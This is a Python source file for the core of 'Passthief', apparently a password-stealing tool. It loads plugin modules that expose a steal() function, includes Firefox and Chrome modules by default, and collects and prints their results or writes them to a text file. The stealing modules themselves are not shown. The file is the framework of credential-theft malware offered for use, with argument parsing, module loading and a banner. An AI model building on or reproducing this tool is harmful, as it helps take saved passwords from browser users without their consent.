# -*- coding: utf-8
from importlib import import_module # For module loading
from sys import path,executable,exit,version_info as version # For various reasons
import os # Basic OS functions
from time import localtime # For time operations
from argparse import ArgumentParser # Argument parsing
# 3rd-party
import colorama as Color # Coloring
from colorama import Fore,Back,Style # Coloring

class PassthiefOutputWriters(object):
	"""Writers for the output."""
	@staticmethod
	def WriteText(outFile,retValue):
		with open(outFile,"w") as writeFile:
			for index in range(0,len(retValue),2):
				writeFile.write("-{name}:\n".format(name=retValue[index]))
				# Check if it's a string or a list of strings
				if isinstance(retValue[index+1],list):
					for line in retValue[index+1]:
						writeFile.write(line+'\n')
				else:
					writeFile.write(retValue[index+1]+'\n')

class PassthiefCore(object):
	"""Core of the Passthief script"""
	# Static variables
	OutputWriters = { 'text' : PassthiefOutputWriters.WriteText}
	# Initializes the script
	@staticmethod
	def Initialize():
		# Init colorama
		Color.init()
		# Add myself to the path (for pyinstaller's hiddenimports)
		path.append(os.path.dirname(executable))
	# Check for the Python version
	@staticmethod
	def CheckVersion():
		return (version.major,version.minor) < (3,2)
	# Check if there is a writer for the specified format
	@staticmethod
	def CheckFormat(outFormat):
		return outFormat not in PassthiefCore.OutputWriters.keys()
	# Load modules
	@staticmethod
	def LoadModules(modulesList):
		modules = list()
		for _ in range(0,len(modulesList)):
			reason = None
			try:
				modules.append(import_module(modulesList[_]))
				m = modules[len(modules) - 1]
				if hasattr(m,"steal"):
					if callable(m.steal):
						print("{green}[*]{white} Loaded module: {blue}{name}{white}".format(name=PassthiefCore.GetModuleName(repr(m)),green=Fore.GREEN,white=Fore.WHITE,blue=Fore.BLUE))
						continue
				raise PassthiefCoreException()
			except ImportError as e:
				reason = "Module not found"
				print("{red}[x]{white} Module not loaded: {blue}{name}{white}\nReason: {reason}".format(name=PassthiefCore.GetModuleName(modulesList[_]),
																					 		  			red=Fore.RED,
																					 	  	  			white=Fore.WHITE,
																					 	  	  			blue=Fore.BLUE,
																							  			reason=reason))
				modules.remove(m)
			except PassthiefCoreException as e:
				reason = e.reason
				print("{red}[x]{white} Module not loaded: {blue}{name}{white}\nReason: {reason}".format(name=PassthiefCore.GetModuleName(modulesList[_]),
																					 		  			red=Fore.RED,
																					 	  	  			white=Fore.WHITE,
																					 	  	  			blue=Fore.BLUE,
																							  			reason=reason))
				modules.remove(m)
		return modules
	# Parse the module name
	@staticmethod
	def GetModuleName(mod):
		mod = mod.split("modules.")[1]
		mod = mod.split("\'")[0]
		mod = list(mod)
		if len(mod) != 1:
			mod[0] = mod[0].upper()
		return ''.join(mod)
	# Parse modules
	@staticmethod
	def ParseModules(modulesList):
		# Check for an empty list
		if modulesList == None:
			modulesList = list()
		# Firefox and Chrome are included by default
		modulesList.append("firefox")
		modulesList.append("chrome")
		# Remove duplicates
		modulesList = list(set(modulesList))
		print("{green}[*]{white} Loading modules:".format(green=Fore.GREEN,
								     					  white=Fore.WHITE))
		# Add the module path
		for i in range(0,len(modulesList)):
				modulesList[i] = "modules.%s" % modulesList[i].lower()
		# Return the list
		return modulesList
	# Get the arguments
	@staticmethod
	def GetArguments():
		# Command line arguments
		parser = ArgumentParser()
		parser.add_argument("-m",metavar="MODULE NAME",nargs="*",help="modules to load")
		parser.add_argument("-o",nargs="?",metavar="FILE", help="output file")
		parser.add_argument("-f",nargs="?",metavar="OUTPUT FORMAT", help="output file format\n(supported are: text, will add xml and html) default: text")
		return parser.parse_args()
	# Prints the fabulous ASCII(ish)-art banner
	@staticmethod
	def PrintBanner():
		print('''
		{red}██████╗  █████╗ ███████╗███████╗████████╗██╗  ██╗██╗███████╗███████╗{reset}
		{yellow}██╔══██╗██╔══██╗██╔════╝██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔════╝{reset}
		{bright}{yellow}██████╔╝███████║███████╗███████╗   ██║   ███████║██║█████╗  █████╗{reset}
		{green}██╔═══╝ ██╔══██║╚════██║╚════██║   ██║   ██╔══██║██║██╔══╝  ██╔══╝{reset}
		{blue}██║     ██║  ██║███████║███████║   ██║   ██║  ██║██║███████╗██║{reset}
		{pink}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚═╝{reset}
		{bright}Version {green}{ver}{white}
		'''.format(ver=VersionInfo.GetInfo(),red=Fore.RED,yellow=Fore.YELLOW,green=Fore.GREEN,
		blue=Fore.BLUE,pink=Fore.MAGENTA,white=Fore.WHITE,reset=Style.RESET_ALL,bright=Style.BRIGHT))
	# Call modules to do their work
	@staticmethod
	def CallModules(modulesList,outFile,outFormat):
		retValue = list()
		for module in modulesList:
			retValue.append(PassthiefCore.GetModuleName(repr(module)))
			retValue.append(module.steal())
		# Check for file
		if outFile is not None:
			PassthiefCore.OutputWriters[outFormat](outFile,retValue)
		else:
			for index in range(0,len(retValue),2):
				print("-{blue}{name}{white}:".format(blue=Fore.BLUE,name=retValue[index],white=Fore.WHITE))
				# Check if it's a string or a list of strings
				if isinstance(retValue[index+1],list):
					for line in retValue[index+1]:
						print(line)
				else:
					print(retValue[index+1])

class PassthiefCoreException(Exception):
	"""A custom exception class"""
	def __init__(self):
		super(PassthiefCoreException, self).__init__()
		self.reason = "Steal method not found"

class VersionInfo(object):
	"""Class for version info retrieval"""
	# Returns the version info
	@staticmethod
	def GetInfo():
		return "%d.%d.%d" % (VersionInfo.GetMajor(),VersionInfo.GetMinor(),VersionInfo.GetRevision())
	# Returns the major version number
	@staticmethod
	def GetMajor():
		return 0
	# Returns the minor version number
	@staticmethod
	def GetMinor():
		return 3
	# Returns the revision number
	@staticmethod
	def GetRevision():
		return 0
